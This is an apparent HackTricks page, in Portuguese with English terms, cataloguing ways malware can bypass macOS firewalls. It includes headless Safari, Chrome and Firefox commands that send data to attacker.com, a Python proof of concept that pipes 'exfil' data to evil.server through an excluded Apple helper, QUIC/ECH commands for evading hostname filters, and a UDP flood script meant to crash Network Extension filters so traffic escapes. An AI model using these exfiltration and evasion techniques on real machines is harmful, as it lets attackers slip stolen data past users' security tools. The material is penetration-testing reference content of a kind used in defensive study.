# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Técnicas encontradas

As seguintes técnicas foram encontradas funcionando em alguns apps de firewall do macOS.

### Abusing whitelist names

- Por exemplo, chamar o malware com nomes de processos bem conhecidos do macOS como **`launchd`**

### Synthetic Click

- Se o firewall solicitar permissão ao usuário, faça o malware **clicar em Allow**

### **Use Apple signed binaries**

- Como **`curl`**, mas também outros como **`whois`**

### Well known apple domains

O firewall pode estar permitindo conexões para domínios bem conhecidos da Apple, como **`apple.com`** ou **`icloud.com`**. E o iCloud pode ser usado como um C2.

### Generic Bypass

Algumas ideias para tentar contornar firewalls

### Check allowed traffic

Conhecer o tráfego permitido ajudará a identificar domínios potencialmente whitelisted ou quais aplicações têm permissão para acessá-los
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusando do DNS

As resoluções DNS são feitas pela aplicação assinada **`mdnsreponder`**, que provavelmente será autorizada a contatar servidores DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Via aplicativos de navegador

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

Se você puder **inject code into a process** que é permitido conectar a qualquer servidor, você poderia contornar as proteções do firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnerabilidades recentes de bypass do firewall no macOS (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
Em julho de 2024 a Apple corrigiu um bug crítico no Safari/WebKit que quebrou o sistema-wide “Web content filter” usado pelos controles parentais do Screen Time.
Um URI especialmente forjado (por exemplo, com “://” duplamente URL-encoded) não é reconhecido pelo Screen Time ACL mas é aceito pelo WebKit, então a requisição é enviada sem filtragem. Qualquer processo que possa abrir uma URL (incluindo código sandboxed ou unsigned) pode, portanto, alcançar domínios que estão explicitamente bloqueados pelo usuário ou por um perfil MDM.

Teste prático (sistema não corrigido):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Bug de ordenação de regras do Packet Filter (PF) nas versões iniciais do macOS 14 “Sonoma”
Durante o ciclo beta do macOS 14 a Apple introduziu uma regressão no wrapper em espaço de usuário em torno de **`pfctl`**.
Regras que foram adicionadas com a keyword `quick` (usada por muitos VPN kill-switches) eram silenciosamente ignoradas, causando traffic leaks mesmo quando a GUI do VPN/firewall reportava *bloqueado*. O bug foi confirmado por vários fornecedores de VPN e corrigido no RC 2 (build 23A344).

Verificação rápida de leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abusando de serviços auxiliares assinados pela Apple (legado – pré-macOS 11.2)
Antes do macOS 11.2, a **`ContentFilterExclusionList`** permitia que cerca de 50 binários da Apple, como **`nsurlsessiond`** e a App Store, contornassem todos os firewalls socket-filter implementados com o Network Extension framework (LuLu, Little Snitch, etc.).
Malware podia simplesmente spawnar um processo excluído — ou injetar código nele — e tunelar seu próprio tráfego pelo socket já permitido. A Apple removeu completamente a lista de exclusão no macOS 11.2, mas a técnica ainda é relevante em sistemas que não podem ser atualizados.

Exemplo de prova de conceito (pré-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH to evade Network Extension domain filters (macOS 12+)
NEFilter Packet/Data Providers baseiam-se no TLS ClientHello SNI/ALPN. Com **HTTP/3 over QUIC (UDP/443)** e **Encrypted Client Hello (ECH)** o SNI permanece criptografado, o NetExt não consegue analisar o fluxo, e as regras de hostname frequentemente falham em aberto, permitindo que malware alcance domínios bloqueados sem tocar no DNS.

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Se QUIC/ECH ainda estiver habilitado, este é um caminho fácil de evasão de filtro por hostname.

### macOS 15 “Sequoia” instabilidade do Network Extension (2024–2025)
Builds iniciais 15.0/15.1 fazem com que filtros de terceiros **Network Extension** travem (LuLu, Little Snitch, Defender, SentinelOne, etc.). Quando o filtro reinicia, o macOS descarta suas regras de fluxo e muitos produtos ficam fail-open. Inundar o filtro com milhares de fluxos UDP curtos (ou forçar QUIC/ECH) pode acionar repetidamente a falha e abrir uma janela para C2/exfil enquanto a GUI ainda afirma que o firewall está em execução.

Reprodução rápida (ambiente de laboratório seguro):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Dicas de ferramentas para macOS moderno

1. Inspecione as PF rules atuais que GUI firewalls geram:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumere binários que já possuem o *outgoing-network* entitlement (útil para piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registre programaticamente seu próprio Network Extension content filter em Objective-C/Swift.
Um PoC rootless mínimo que encaminha packets para um socket local está disponível no código-fonte do **LuLu** de Patrick Wardle.

## Referências

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
